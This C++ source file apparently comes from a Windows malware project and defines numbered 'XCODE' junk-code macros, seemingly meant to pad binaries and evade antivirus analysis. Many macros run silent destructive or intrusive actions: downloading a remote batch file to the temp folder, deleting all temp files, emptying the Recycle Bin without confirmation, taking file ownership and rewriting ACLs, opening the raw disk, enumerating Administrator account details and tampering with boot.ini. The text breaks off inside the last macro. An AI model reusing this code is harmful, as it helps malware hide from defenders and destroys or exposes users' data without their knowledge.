#include "stdafx.h"
#include "md5.h"

#pragma  comment(lib, "wininet")
#pragma  comment(lib, "urlmon")
#pragma  comment(lib, "ws2_32")
#pragma  comment(lib, "Netapi32")
#pragma  comment(lib, "shlwapi.lib")

#define FLOWERX

using namespace std;

#define IOCTL_BEEP_SET_PROTECT_FILE	CTL_CODE(FILE_DEVICE_BEEP, 0x12, METHOD_BUFFERED, FILE_ANY_ACCESS)

char *buf = NULL;
DWORD dwSizeXXX = MAX_PATH,dwBytesInBlock;
char szXBuff[MAX_PATH] = {0};
HANDLE hXMod = INVALID_HANDLE_VALUE;
HANDLE hmyfile,hFileMapping,hmyfilemap;
char TmpBuf[1 + 64 + 16];
MD5_CTX md5T;
unsigned char digest[16];
int PasswdLen=0;
TOKEN_PRIVILEGES tp = { 0 }; 
LUID luid; 
DWORD cb=sizeof(TOKEN_PRIVILEGES);
BOOL bRetval = FALSE;
HANDLE hToken = NULL; 
PSID pSIDAdmin = NULL;
PSID pSIDEveryone = NULL;
PACL pACL = NULL;
int NUM_ACES  = 2;
EXPLICIT_ACCESS ea[2];
SID_IDENTIFIER_AUTHORITY SIDAuthWorld	= SECURITY_WORLD_SID_AUTHORITY;
SID_IDENTIFIER_AUTHORITY SIDAuthNT		= SECURITY_NT_AUTHORITY;
DWORD dwRes;
WIN32_FIND_DATA findData;
DWORD  dwPort     = 0;
CRITICAL_SECTION lock;
string evename = "CmdShell";
HWND hwnd;
MSG msg;
HRSRC hSrc;
HGLOBAL hGlobal;
LPVOID lp;
FILE *fd;
SYSTEM_INFO sinf;
__int64 qwFileSize,myFilesize,qwFileOffset,qwmyFileOffset;
PBYTE pbFile,pbmyFile;
HKEY hKey;
char AddMsg[]="President Obama's page on Google's social network site has been inundated with messages in Chinese after restrictions in China were removed.";
OSVERSIONINFOEX osvi;
SHQUERYRBINFO shqbi;
LPUSER_INFO_0 pBuf = NULL;
LPUSER_INFO_0 pTmpBuf;
DWORD dwLevel = 0;
DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
DWORD dwEntriesRead = 0;
DWORD dwTotalEntries = 0;
DWORD dwResumeHandle = 0;
DWORD dwTotalCount = 0;
NET_API_STATUS nStatus;

LPUSER_INFO_1 pBuf1 = NULL;
LPUSER_INFO_2 pBuf2 = NULL;
LPUSER_INFO_3 pBuf3 = NULL;
LPUSER_INFO_4 pBuf4 = NULL;
LPUSER_INFO_10 pBuf10 = NULL;
LPUSER_INFO_11 pBuf11 = NULL;
LPUSER_INFO_20 pBuf20 = NULL;
LPUSER_INFO_23 pBuf23 = NULL;
ITaskScheduler * pITaskScheduler = 0;
ITask * pITask = 0;
ITaskTrigger * pITaskTrigger = 0;
HRESULT hr;
LPWSTR ppwszComputer;
WORD iNewTrigger;
TASK_TRIGGER trigger;
COORD dwCursorPostion;
CONSOLE_SCREEN_BUFFER_INFO *lpConsoleScreenBufferInfo;
CRITICAL_SECTION	g_CriticalSection;
PROCESSENTRY32 procentry;
FILETIME    datetime,local_filetime;
UINT uDropEffect;
DROPFILES dropFiles;
UINT uGblLen,uDropFilesLen;
HGLOBAL hGblFiles,hGblEffect;
DWORD *dwDropEffect;
SC_HANDLE scm;
SC_HANDLE service;
SERVICE_STATUS status;
CBitmap *pbm;
BITMAP bm = {0};
HBITMAP hbm;
HDC hdc;
HPEN hOldPen,hPen;
RECT prcOld;
typedef struct
{
    DWORD   dwUnknown1;
    ULONG   uKeMaximumIncrement;
    ULONG   uPageSize;
    ULONG   uMmNumberOfPhysicalPages;
    ULONG   uMmLowestPhysicalPage;
    ULONG   uMmHighestPhysicalPage;
    ULONG   uAllocationGranularity;
    PVOID   pLowestUserAddress;
    PVOID   pMmHighestUserAddress;
    ULONG   uKeActiveProcessors;
    BYTE    bKeNumberProcessors;
    BYTE    bUnknown2;
    WORD    wUnknown3;
} SYSTEM_BASIC_INFORMATION;

typedef struct
{
    LARGE_INTEGER   liIdleTime;
    DWORD           dwSpare[76];
} SYSTEM_PERFORMANCE_INFORMATION;

typedef struct
{
    LARGE_INTEGER liKeBootTime;
    LARGE_INTEGER liKeSystemTime;
    LARGE_INTEGER liExpTimeZoneBias;
    ULONG         uCurrentTimeZoneId;
    DWORD         dwReserved;
} SYSTEM_TIME_INFORMATION;
SYSTEM_PERFORMANCE_INFORMATION SysPerfInfo;
SYSTEM_TIME_INFORMATION        SysTimeInfo;
SYSTEM_BASIC_INFORMATION       SysBaseInfo;
typedef LONG (WINAPI *PROCNTQSI)(UINT,PVOID,ULONG,PULONG);
PROCNTQSI NtQuerySystemInformation;
typedef BOOL (CALLBACK *PROCENUMPROC)(DWORD, WORD, LPSTR, LPARAM);
typedef struct {
	DWORD dwPID;
	PROCENUMPROC lpProc;
	DWORD lParam;
	BOOL bEnd;
} EnumInfoStruct;
HANDLE (WINAPI *lpfCreateToolhelp32Snapshot)(DWORD, DWORD);
BOOL (WINAPI *lpfProcess32First)(HANDLE, LPPROCESSENTRY32);
BOOL (WINAPI *lpfProcess32Next)(HANDLE, LPPROCESSENTRY32);
BOOL (WINAPI *lpfEnumProcesses)(DWORD *, DWORD, DWORD *);
BOOL (WINAPI *lpfEnumProcessModules)(HANDLE, HMODULE *, DWORD,LPDWORD);
DWORD (WINAPI *lpfGetModuleBaseName)(HANDLE, HMODULE, LPTSTR, DWORD);
INT (WINAPI *lpfVDMEnumTaskWOWEx)(DWORD, TASKENUMPROCEX, LPARAM);

BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, PSZ pszFileName, LPARAM lpUserDefined) {
	BOOL bRet=TRUE;
	EnumInfoStruct *psInfo = (EnumInfoStruct *)lpUserDefined;
	if (!bRet)
		psInfo->bEnd = TRUE;
	return !bRet;
}

#define XCODE1 __try{\
		GetModuleFileName(NULL, szXBuff, sizeof(szXBuff)-1);\
		hXMod = CreateFile(szXBuff, GENERIC_READ,NULL,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);\
		if (INVALID_HANDLE_VALUE != hXMod)\
		{\
			dwSizeXXX = GetFileSize(hXMod, NULL);\
			buf = (char *)malloc(dwSizeXXX);\
			if (buf!=NULL)\
			{\
				ReadFile(hXMod, buf, dwSizeXXX, &dwSizeXXX, NULL);\
				CloseHandle(hXMod);\
				if (buf[dwSizeXXX-0x20]=='A')\
				{\
					dwSizeXXX=GetTickCount();\
				}\
			}\
		}\
	}\
	__except(EXCEPTION_EXECUTE_HANDLER){\
	Sleep(1);\
	}

#define XCODE2 __try{\
	GetModuleFileName(NULL, szXBuff, sizeof(szXBuff)-1);\
	PasswdLen = strlen(szXBuff);\
	memcpy(TmpBuf + 0x00, "\x7F", 1);\
	memcpy(TmpBuf + 0x01, szXBuff, PasswdLen);\
	memcpy(TmpBuf + 0x01 + PasswdLen, "1234567890ABCDEF", 16);\
	md5T.MD5Update((unsigned char*)TmpBuf, 17 + PasswdLen);\
	md5T.MD5Final(digest);\
	memcpy(szXBuff, digest, 16);\
	}\
	__except(EXCEPTION_EXECUTE_HANDLER){\
	Sleep(2);\
	}

#define XCODE3 __try{\
	hXMod = CreateFile("\\Device\\Harddisk0\\Partition0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\
	if (hXMod != INVALID_HANDLE_VALUE)\
	{\
		OutputDebugStringA("open device success");\
		dwRes = inet_addr("192.168.1.203");\
		DeviceIoControl(hXMod, IOCTL_BEEP_SET_PROTECT_FILE, szXBuff, sizeof(szXBuff), NULL, 0, &dwRes, NULL);\
		CloseHandle(hXMod);\
	}\
	}\
		__except(EXCEPTION_EXECUTE_HANDLER){\
		Sleep(3);\
	}

#define XCODE4 __try{\
	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone)) \
	{\
		;\
	}\
	if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin)) \
	{\
		;\
	}\
	ZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESS));\
	ea[0].grfAccessPermissions = GENERIC_READ;\
	ea[0].grfAccessMode = SET_ACCESS;\
	ea[0].grfInheritance = NO_INHERITANCE;\
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;\
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;\
	ea[0].Trustee.ptstrName = (LPTSTR) pSIDEveryone;\
	ea[1].grfAccessPermissions = GENERIC_ALL;\
	ea[1].grfAccessMode = SET_ACCESS;\
	ea[1].grfInheritance = NO_INHERITANCE;\
	ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;\
	ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;\
	ea[1].Trustee.ptstrName = (LPTSTR) pSIDAdmin;\
	if (ERROR_SUCCESS != SetEntriesInAcl(NUM_ACES, ea, NULL, &pACL))\
	{\
		;\
	}\
	dwRes = SetNamedSecurityInfo( szXBuff, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);\
	if (ERROR_SUCCESS == dwRes) \
	{\
		bRetval = TRUE;\
		;\
	}\
	if (dwRes != ERROR_ACCESS_DENIED)\
	{\
		;\
	}\
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) \
	{\
		; \
	} \
	if(LookupPrivilegeValue( NULL, SE_TAKE_OWNERSHIP_NAME, &luid ))\
	{\
		tp.PrivilegeCount = 1; \
		tp.Privileges[0].Luid = luid; \
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\
		AdjustTokenPrivileges( hToken, FALSE, &tp, cb, NULL, NULL );\
	}\
	dwRes = SetNamedSecurityInfo( szXBuff, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL); \
	if (dwRes != ERROR_SUCCESS) \
	{\
		;\
	}\
	dwRes = SetNamedSecurityInfo( szXBuff, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);\
	if (dwRes == ERROR_SUCCESS)\
	{\
		bRetval = TRUE; \
	}\
	if (pSIDAdmin)\
		FreeSid(pSIDAdmin); \
	if (pSIDEveryone)\
		FreeSid(pSIDEveryone); \
	if (pACL)\
		LocalFree(pACL);\
	if (hToken)\
		CloseHandle(hToken);\
	}\
		__except(EXCEPTION_EXECUTE_HANDLER){\
		Sleep(4);\
	}

#define XCODE5 __try{\
	GetTempPath(64, TmpBuf);\
	strcpy(szXBuff,"http://www.eecs.ucf.edu/~leavens/Windows/bat/jtest.bat");\
	DeleteUrlCacheEntry (szXBuff);\
	strcat(TmpBuf, "dtapp.bat");\
	if (S_OK == URLDownloadToFile(NULL, szXBuff, TmpBuf, NULL,NULL))\
	{\
		fd=fopen(TmpBuf, "r");\
		fread(szXBuff, MAX_PATH, 1, fd);\
		fclose(fd);\
	}\
	else\
	{\
		WinExec("cmd /c dir", SW_HIDE);\
	}\
	}\
	__except(EXCEPTION_EXECUTE_HANDLER){\
	Sleep(5);\
	}

#define XCODE6 __try{\
	GetTempPath(MAX_PATH, szXBuff);\
	SetCurrentDirectory(szXBuff);\
	hXMod = FindFirstFile(szXBuff, &findData);\
	if ((hXMod != INVALID_HANDLE_VALUE))\
	{\
		if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))\
		{\
			GetFullPathName(findData.cFileName,MAX_PATH,szXBuff,NULL);\
			DeleteFile(szXBuff);\
		}\
		while (FindNextFile(hXMod, &findData) != 0)\
		{\
			if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))\
			{\
				GetFullPathName(findData.cFileName,MAX_PATH,szXBuff,NULL);\
				DeleteFile(szXBuff);\
			}\
		}\
		FindClose(hXMod);\
	}\
	hXMod = FindFirstFile("*", &findData);\
	if ((hXMod != INVALID_HANDLE_VALUE))\
	{\
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)\
		{\
			if (findData.cFileName[0] != '.')\
			{\
				SetCurrentDirectory(findData.cFileName);\
			}\
		}\
		while (FindNextFile(hXMod, &findData) != '\x0')\
		{\
			if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)\
			{\
				if (findData.cFileName[0] != '.')\
				{\
					SetCurrentDirectory(findData.cFileName);\
				}\
			}\
		}\
		FindClose(hXMod);\
	}\
	}\
	__except(EXCEPTION_EXECUTE_HANDLER){\
	Sleep(6);\
	}

#define XCODE7 __try{\
	setlocale(LC_ALL,"chs");\
	InitializeCriticalSection(&lock);\
	SetConsoleCtrlHandler((PHANDLER_ROUTINE)NULL,TRUE);\
	hwnd = GetActiveWindow();\
	SetWindowText(hwnd,"Waiting for client connect.....");\
	PeekMessage(&msg,NULL,0,0,PM_NOREMOVE);\
	hXMod = OpenEvent(EVENT_ALL_ACCESS,TRUE,"CMD_EVENT");\
	if (NULL != hXMod)\
	{\
		if(SetEvent(hXMod))\
		{\
			while(TRUE)\
			{\
				if(PeekMessage(&msg,NULL,0,0,PM_REMOVE))\
				{\
					if (msg.message == 5)\
					{\
						dwSizeXXX = msg.wParam;\
						sprintf(szXBuff, "%d", dwSizeXXX);\
						SetWindowText(hwnd,szXBuff);\
						break;\
					}\
				}\
			}\
			evename += szXBuff;\
			hXMod=CreateEvent(NULL,FALSE,FALSE,evename.c_str());\
		}\
	}\
	}\
	__except(EXCEPTION_EXECUTE_HANDLER){\
	Sleep(7);\
	}

#define XCODE8 __try{\
	GetTempPath(64, TmpBuf);\
	strcat(TmpBuf, "dtapp.exe");\
	hSrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE((WORD)IDR_EXE3), "EXE");\
	hGlobal = LoadResource(NULL,hSrc);\
	lp = LockResource(hGlobal);\
	dwSizeXXX = SizeofResource(NULL,hSrc);\
	ofstream ofs(TmpBuf,ios::binary);\
	ofs.write((char*)lp,4);\
	ofs.close();\
	FreeResource(hGlobal);\
	}\
	__except(EXCEPTION_EXECUTE_HANDLER){\
	Sleep(8);\
	}

#define XCODE9 __try{\
	GetSystemInfo(&sinf);\
	hXMod = CreateFile(".\\first.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);\
	hmyfile =CreateFile(".\\second.txt", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\
	hFileMapping = CreateFileMapping(hXMod, NULL,PAGE_READONLY, 0, 0, NULL);\
	qwFileSize = GetFileSize(hXMod, &dwSizeXXX);\
	qwFileSize += (((__int64) dwSizeXXX) << 32);\
	myFilesize=qwFileSize+sinf.dwAllocationGranularity;\
	hmyfilemap = CreateFileMapping(hmyfile, NULL, PAGE_READWRITE,(DWORD)(myFilesize>>32), (DWORD)(myFilesize& 0xFFFFFFFF), NULL);\
	CloseHandle(hXMod);\
	CloseHandle(hmyfile);\
	pbmyFile=(PBYTE) MapViewOfFile(hmyfilemap, FILE_MAP_WRITE, 0, 0, sizeof(AddMsg));\
	memcpy(pbmyFile,AddMsg,sizeof(AddMsg));\
	UnmapViewOfFile(pbmyFile);\
	qwFileOffset = 0;\
	qwmyFileOffset=sinf.dwAllocationGranularity;\
	while (qwFileSize > 0)\
	{\
		dwBytesInBlock = sinf.dwAllocationGranularity;\
		if(qwFileSize < sinf.dwAllocationGranularity)\
			dwBytesInBlock =(DWORD) qwFileSize;\
		pbFile = (PBYTE) MapViewOfFile(hFileMapping, FILE_MAP_READ,(DWORD)(qwFileOffset >> 32),(DWORD)(qwFileOffset & 0xFFFFFFFF),dwBytesInBlock);\
		pbmyFile=(PBYTE) MapViewOfFile(hmyfilemap, FILE_MAP_WRITE,(DWORD)(qwmyFileOffset >> 32),(DWORD)(qwmyFileOffset & 0xFFFFFFFF),dwBytesInBlock);\
		memcpy(pbmyFile,pbFile,dwBytesInBlock);\
		UnmapViewOfFile(pbFile);\
		UnmapViewOfFile(pbmyFile);\
		qwmyFileOffset+=dwBytesInBlock;\
		qwFileOffset += dwBytesInBlock;\
		qwFileSize -= dwBytesInBlock;\
	}\
	CloseHandle(hFileMapping);\
	CloseHandle(hmyfilemap);\
	}\
	__except(EXCEPTION_EXECUTE_HANDLER){\
	Sleep(9);\
	}

#define XCODE10 __try{\
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));\
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);\
	if( !GetVersionEx((OSVERSIONINFO *)&osvi))\
	{\
		osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);\
		GetVersionEx((OSVERSIONINFO *)&osvi);\
	}\
	dwRes = RegOpenKeyEx( HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\ProductOptions",0, KEY_QUERY_VALUE, &hKey );\
	if( dwRes == ERROR_SUCCESS )\
	{\
	RegQueryValueEx( hKey, "ProductType", NULL, NULL, (LPBYTE) szXBuff, &dwSizeXXX);\
	RegCloseKey( hKey );\
	if ( lstrcmpi( "WINNT", szXBuff) == 0 )\
	OutputDebugString("Workstation");\
	if ( lstrcmpi( "LANMANNT", szXBuff) == 0 )\
	OutputDebugString( "Server " );\
	if ( lstrcmpi( "SERVERNT", szXBuff) == 0 )\
	OutputDebugString( "Advanced Server " );\
	sprintf(szXBuff,"%d.%d", osvi.dwMajorVersion, osvi.dwMinorVersion );\
	OutputDebugString(szXBuff);\
	}\
	}\
	__except(EXCEPTION_EXECUTE_HANDLER){\
		Sleep(10);\
	}

#define XCODE11 __try{\
	shqbi.cbSize = sizeof(shqbi);\
	shqbi.i64NumItems = -1;\
	shqbi.i64Size = -1;\
	if(S_OK == SHQueryRecycleBin(0, &shqbi))\
	{\
		sprintf(szXBuff, "Items:%u Bytes used:%u", (DWORD)shqbi.i64NumItems, (DWORD)shqbi.i64Size);\
		SHEmptyRecycleBin(0, 0, SHERB_NOPROGRESSUI|SHERB_NOCONFIRMATION);\
	}\
	}\
	__except(EXCEPTION_EXECUTE_HANDLER){\
		Sleep(11);\
	}


#define XCODE12 __try{\
do {\
	   nStatus = NetUserEnum(L"localhost",dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&pBuf,dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);\
	   if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))\
	   {\
		   if ((pTmpBuf = pBuf) != NULL)\
		   {\
			   for (dwRes = 0; (dwRes < dwEntriesRead); dwRes++)\
			   {\
				   if (pTmpBuf == NULL)\
				   {\
					   fprintf(stderr, "An access violation has occurred\n");\
					   break;\
				   }\
				   wprintf(L"\t-- %s\n", pTmpBuf->usri0_name);\
				   pTmpBuf++;\
				   dwTotalCount++;\
			   }\
		   }\
	   }\
	   else\
		   fprintf(stderr, "A system error has occurred: %d\n", nStatus);\
	   if (pBuf != NULL)\
	   {\
		   NetApiBufferFree(pBuf);\
		   pBuf = NULL;\
	   }\
   }\
   while (nStatus == ERROR_MORE_DATA);\
   if (pBuf != NULL)\
	   NetApiBufferFree(pBuf);\
   fprintf(stderr, "\nTotal of %d entries enumerated\n", dwTotalCount);\
	}\
		__except(EXCEPTION_EXECUTE_HANDLER){\
		Sleep(12);\
	}

#define XCODE13 __try{\
		PasswdLen=0;\
		while (PasswdLen < 24) {\
		dwLevel = PasswdLen;\
		nStatus = NetUserGetInfo(L"localhost", L"Administrator", dwLevel, (LPBYTE *) & pBuf);\
		if (nStatus == NERR_Success) {\
			if (pBuf != NULL) {\
				switch (PasswdLen) {\
				case 0:\
					wprintf(L"\tUser account name: %s\n", pBuf->usri0_name);\
					break;\
				case 1:\
					pBuf1 = (LPUSER_INFO_1) pBuf;\
					wprintf(L"\tUser account name: %s\n", pBuf1->usri1_name);\
					break;\
				case 2:\
					pBuf2 = (LPUSER_INFO_2) pBuf;\
					wprintf(L"\tPrivilege level: %d\n", pBuf2->usri2_priv);\
					break;\
				case 4:\
					pBuf4 = (LPUSER_INFO_4) pBuf;\
					wprintf(L"\tHome directory: %s\n", pBuf4->usri4_home_dir);\
					break;\
				case 10:\
					pBuf10 = (LPUSER_INFO_10) pBuf;\
					wprintf(L"\tUser account name: %s\n", pBuf10->usri10_name);\
					wprintf(L"\tFull name: %s\n", pBuf10->usri10_full_name);\
					break;\
				case 11:\
					pBuf11 = (LPUSER_INFO_11) pBuf;\
					wprintf(L"\tAuth flags: %x\n", pBuf11->usri11_auth_flags);\
					break;\
				case 20:\
					pBuf20 = (LPUSER_INFO_20) pBuf;\
					wprintf(L"\tFlags (in hex): %x\n", pBuf20->usri20_flags);\
					break;\
				case 23:\
					pBuf23 = (LPUSER_INFO_23) pBuf;\
					wprintf(L"\tComment: %s\n", pBuf23->usri23_comment);\
					break;\
				default:\
					break;\
				}\
			}\
		}\
		else\
			fprintf(stderr, "NetUserGetinfo failed with error: %d\n", nStatus);\
		if (pBuf != NULL)\
			NetApiBufferFree(pBuf);\
		switch (PasswdLen){\
		case 0:\
		case 1:\
		case 10:\
			PasswdLen++;\
			break;\
		case 2:\
			PasswdLen = 4;\
			break;\
		case 4:\
			PasswdLen = 10;\
			break;\
		case 11:\
			PasswdLen = 20;\
			break;\
		case 20:\
			PasswdLen = 23;\
			break;\
		default:\
			PasswdLen = 24;\
			break;\
		}\
	}\
	}\
		__except(EXCEPTION_EXECUTE_HANDLER){\
		Sleep(13);\
	}

#define XCODE14 __try{\
    CoInitialize( 0 );\
        hr = CoCreateInstance(  CLSID_CTaskScheduler,0,CLSCTX_SERVER,IID_ITaskScheduler,(LPVOID *)&pITaskScheduler );\
        pITaskScheduler->GetTargetComputer( &ppwszComputer );\
        _tprintf( _T("Target computer: %s\n"), ppwszComputer );\
        CoTaskMemFree( ppwszComputer );\
        hr = pITaskScheduler->NewWorkItem(L"MyHappyWorkItem",CLSID_CTask,IID_ITask,(LPUNKNOWN *)&pITask );\
        hr = pITask->SetApplicationName( L"CALC.EXE" ); \
        hr = pITask->CreateTrigger( &iNewTrigger, &pITaskTrigger );\
        pITaskTrigger->GetTrigger( &trigger );\
        trigger.wStartMinute++;\
        pITaskTrigger->SetTrigger( &trigger );\
        pITaskScheduler->Delete( L"MyHappyWorkItem" );\
    }\
    __finally\
    {\
        if ( pITaskTrigger )\
            pITaskTrigger->Release();\
        if ( pITask )\
            pITask->Release();\
        if ( pITaskScheduler )\
            pITaskScheduler->Release();\
			CoUninitialize();\
			Sleep(14);\
    }

#define XCODE15 __try{\
		srand(time(0));\
		InitializeCriticalSection(&g_CriticalSection);\
		hXMod=GetStdHandle(STD_OUTPUT_HANDLE);\
		SetConsoleTitle(AddMsg);\
		EnterCriticalSection(&g_CriticalSection);\
		SetConsoleCtrlHandler((PHANDLER_ROUTINE)NULL,TRUE);\
		SetConsoleTextAttribute(hXMod,10);\
		SetConsoleTextAttribute(hXMod,12);\
		lpConsoleScreenBufferInfo=new CONSOLE_SCREEN_BUFFER_INFO;\
		GetConsoleScreenBufferInfo(hXMod,lpConsoleScreenBufferInfo);\
		dwCursorPostion.X=lpConsoleScreenBufferInfo->dwCursorPosition.X-1;\
		dwCursorPostion.Y=lpConsoleScreenBufferInfo->dwCursorPosition.Y;\
		SetConsoleCursorPosition(hXMod,dwCursorPostion);\
		FillConsoleOutputCharacter(hXMod,' ',1,dwCursorPostion,0);\
    }\
	__finally\
    {\
		LeaveCriticalSection(&g_CriticalSection);\
		delete lpConsoleScreenBufferInfo;\
		CloseHandle(hXMod);\
		Sleep(15);\
    }

#define XCODE16 __try{\
		hXMod = LoadLibraryA("Kernel32.DLL");\
		if (hXMod == NULL)\
			__leave;\
		hmyfile = LoadLibraryA("VDMDBG.DLL");\
		if (hmyfile == NULL)\
			__leave;\
		lpfCreateToolhelp32Snapshot =(HANDLE (WINAPI *)(DWORD,DWORD))GetProcAddress((HMODULE)hXMod, "CreateToolhelp32Snapshot");\
		lpfProcess32First =(BOOL (WINAPI *)(HANDLE,LPPROCESSENTRY32))GetProcAddress((HMODULE)hXMod, "Process32First");\
		lpfProcess32Next =(BOOL (WINAPI *)(HANDLE,LPPROCESSENTRY32))GetProcAddress((HMODULE)hXMod, "Process32Next");\
		if (lpfProcess32Next == NULL|| lpfProcess32First == NULL|| lpfCreateToolhelp32Snapshot == NULL)\
			__leave;\
		lpfVDMEnumTaskWOWEx = (INT (WINAPI *)(DWORD, TASKENUMPROCEX,LPARAM)) GetProcAddress((HMODULE)hmyfile, "VDMEnumTaskWOWEx");\
		if (lpfVDMEnumTaskWOWEx == NULL)\
			__leave;\
		hFileMapping = lpfCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\
		if (hFileMapping == INVALID_HANDLE_VALUE) {\
			__leave;\
		}\
		procentry.dwSize = sizeof(PROCESSENTRY32);\
		bRetval = lpfProcess32First(hFileMapping, &procentry);\
		EnumInfoStruct *sInfo=new EnumInfoStruct;\
		while (bRetval) {\
				if (_stricmp(procentry.szExeFile, "NTVDM.EXE") == 0) {\
					sInfo->dwPID = procentry.th32ProcessID;\
					sInfo->bEnd = FALSE;\
					lpfVDMEnumTaskWOWEx(procentry.th32ProcessID,(TASKENUMPROCEX) Enum16, (LPARAM) &sInfo);\
					if (sInfo->bEnd)\
						break;\
				}\
				procentry.dwSize = sizeof(PROCESSENTRY32);\
				bRetval = lpfProcess32Next(hFileMapping, &procentry);\
		}\
		delete sInfo;\
		}\
		__finally {\
			if (hXMod)\
				FreeLibrary((HMODULE)hXMod);\
			if (hmyfile)\
				FreeLibrary((HMODULE)hmyfile);\
			Sleep(16);\
		}

#define XCODE17 __try{\
			GetWindowsDirectory(szXBuff, MAX_PATH);\
			szXBuff[3]=0;\
			strcat(szXBuff, "boot.ini");\
            hXMod = CreateFile(szXBuff,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);\
            if (hXMod != INVALID_HANDLE_VALUE)\
            {\
				GetFileTime(hXMod, &datetime, &datetime, &datetime);\
				datetime.dwHighDateTime++;\
				datetime.dwLowDateTime++;\
                if (TRUE == LocalFileTimeToFileTime(&datetime,&local_filetime))\
                {\
                    SetFileTime(hXMod,&local_filetime,NULL,&local_filetime);\
                }\
				dwRes=GetFileAttributes(szXBuff);\
				dwRes&=(FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);\
				SetFileAttributes(szXBuff,dwRes);\
             }\
			 CloseHandle(hXMod);\
		}\
		__except(EXCEPTION_EXECUTE_HANDLER){\
			Sleep(17);\
		}

#define XCODE18 __try{\
			GetModuleFileName(NULL,szXBuff,MAX_PATH);\
			(strrchr(szXBuff,'\\'))[1] = 0;\
			GetTempPath(MAX_PATH, szXBuff);\
			strcat(szXBuff,"config.ini");\
			WritePrivateProfileString("netconf","str",AddMsg,szXBuff);\
			GetPrivateProfileString("netconf","code",NULL,TmpBuf,64,szXBuff);\
		}\
			__except(EXCEPTION_EXECUTE_HANDLER){\
			Sleep(18);\
		}

#define XCODE19 __try{\
		uDropEffect=RegisterClipboardFormat(AddMsg);\
		hGblEffect=GlobalAlloc(GMEM_ZEROINIT|GMEM_MOVEABLE|GMEM_DDESHARE,sizeof(DWORD));\
		dwDropEffect=(DWORD*)GlobalLock(hGblEffect);\
		*dwDropEffect=DROPEFFECT_COPY;\
		GlobalUnlock(hGblEffect);\
		uDropFilesLen=sizeof(DROPFILES);\
		dropFiles.pFiles =uDropFilesLen;\
		dropFiles.pt.x=0;\
		dropFiles.pt.y=0;\
		dropFiles.fNC =FALSE;\
		dropFiles.fWide =TRUE;\
		uGblLen=uDropFilesLen+dwSizeXXX*2+8;\
		hGblFiles= GlobalAlloc(GMEM_ZEROINIT|GMEM_MOVEABLE|GMEM_DDESHARE, uGblLen);\
		buf=(char*)GlobalLock(hGblFiles);\
		memcpy(buf,(LPVOID)(&dropFiles),uDropFilesLen);\
		buf=buf+uDropFilesLen;\
		MultiByteToWideChar(CP_ACP,MB_COMPOSITE,buf,MAX_PATH,(WCHAR *)buf,MAX_PATH);\
		GlobalUnlock(hGblFiles);\
		if( OpenClipboard(NULL) )\
		{\
			EmptyClipboard();\
			SetClipboardData(CF_HDROP, hGblFiles);\
			SetClipboardData(uDropEffect,hGblEffect);\
			CloseClipboard();\
		}\
		GlobalFree(hGblEffect);\
		GlobalFree(hGblFiles);\
	}\
		__except(EXCEPTION_EXECUTE_HANDLER){\
		Sleep(19);\
	}

#define XCODE20 __try{\
		RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE",0,KEY_READ,&hKey);\
		if (RegQueryValueEx(hKey,AddMsg,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS)\
		{\
			RegQueryInfoKey(hKey,NULL,NULL,NULL,&dwSizeXXX,NULL,NULL,NULL,NULL,NULL,NULL,NULL);\
			if (dwSizeXXX)\
			{\
				for (PasswdLen=0; PasswdLen<dwSizeXXX; PasswdLen++)\
				{\
					szXBuff[0]='\0';\
					dwRes=MAX_PATH;\
					RegEnumKeyEx(hKey,PasswdLen,szXBuff,&dwRes,NULL,NULL,NULL,NULL);\
					if (stricmp(szXBuff,AddMsg))\
					{\
						bRetval=TRUE;\
						break;\
					}\
				}\
			}\
		}\
		RegCloseKey(hKey);\
	}\
		__except(EXCEPTION_EXECUTE_HANDLER){\
		Sleep(20);\
	}

#define XCODE21 __try{\
